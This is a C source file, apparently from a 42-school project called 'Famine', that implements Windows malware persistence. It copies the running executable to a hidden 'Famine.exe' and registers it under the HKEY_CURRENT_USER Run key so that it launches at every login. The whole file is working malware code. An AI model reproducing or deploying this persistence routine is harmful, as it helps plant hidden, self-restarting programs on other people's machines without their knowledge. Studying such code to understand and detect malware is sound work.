/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   registery.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/08/04 01:25:34 by frmarinh          #+#    #+#             */
/*   Updated: 2017/08/04 01:25:41 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

/*
**	Save the file
*/
static bool		save_new_file(char *path, t_famine *famine)
{
	HANDLE	file;
	DWORD	dwBytesToWrite = (DWORD)famine->buffer_len, dwBytesWritten;
	if ((file = CreateFile(path,
		GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL)) == NULL) {
		print_message(famine, "Can't open a file for saving", false);
		return (false);
	}
	WriteFile(file, famine->buffer, dwBytesToWrite, &dwBytesWritten, NULL);
	if (dwBytesWritten <= 0) {
		print_message(famine, "Can't replace a file content", false);
		return (false);
	}
	CloseHandle(file);
	return (true);
}

/*
**	Get the content of the executable and the length
*/
static void			get_famine_content(t_famine *famine)
{
	int			bytes	= 0;
    int			fd		= 0;
	HANDLE		file	= NULL;
	HANDLE		mapping	= NULL;

	if ((fd = open(famine->executable_path, O_RDONLY)) == -1) {
		print_message(famine, strerror(errno), false);
		return;
	}
	if ((famine->buffer_len = lseek(fd, 0, SEEK_END)) <= 0) {
		print_message(famine, strerror(errno), false);
		return;
	}
	close (fd);
	if ((file = CreateFile(famine->executable_path, GENERIC_READ,
	0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)) == NULL) {
		print_message(famine, strerror(errno), false);
	}
	if ((mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0)) == NULL)
		print_message(famine, strerror(errno), false);
	famine->buffer = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
	CloseHandle(file);
}

/*
**	Save the hidden famine and return his path
*/
static char			*save_hidden_famine(t_famine *famine)
{
	char	*new_path	= NULL;
	char	*name		= ft_strdup("\\Famine.exe");
	if (!(new_path = ft_strnew(ft_strlen(famine->path) + ft_strlen(name))))
		return (NULL);
	ft_strcat(new_path, famine->path);
	ft_strcat(new_path, name);
	ft_strdel(&name);
	get_famine_content(famine);
	return (save_new_file(new_path, famine) ? new_path : NULL);
}

/*
**	Add to startup a new famine hidden in temporary files on registery HKEY_CURRENT_USER
*/
void				startup_registery(t_famine *famine)
{
	HKEY		hKey;
	LPCTSTR		keyTarget		= TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	LPCTSTR		value			= TEXT(STARTUP_VALUE);
	LONG		openRes, setRes;

	if ((openRes = RegCreateKeyEx(
        HKEY_CURRENT_USER,
        keyTarget,
        0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL)) != ERROR_SUCCESS) {
			printf("Can't create a registery value for startup (error code %d)\n", openRes);
			return;
		}
	char	*path	= save_hidden_famine(famine);
	if (path != NULL) {
		char		*data	= ft_strnew(ft_strlen(path) + ft_strlen(ARGS_STARTUP));
		if (data != NULL) {
			ft_strcat(data, path);
			if (famine->debug) {
				ft_strcat(data, ARGS_STARTUP);
			}
			if ((setRes = RegSetValueEx (hKey, value, 0, REG_SZ, (LPBYTE)data, ft_strlen(data) + 1)) != ERROR_SUCCESS) {
				printf("Can't set a registery value for startup (error code %d)\n", setRes);
				return;
			}
			printf("Startup (%s) saved succesfully\n", path);
			ft_strdel(&path);
		}
	}
}
